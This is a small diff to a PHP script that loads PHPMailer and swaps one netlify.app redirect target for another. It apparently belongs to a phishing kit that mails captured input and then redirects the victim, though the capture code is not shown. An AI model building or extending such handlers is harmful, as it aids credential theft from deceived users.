@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://team-work-more-info.netlify.app/");
+header("Location: https://review-us-concatenation-info.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
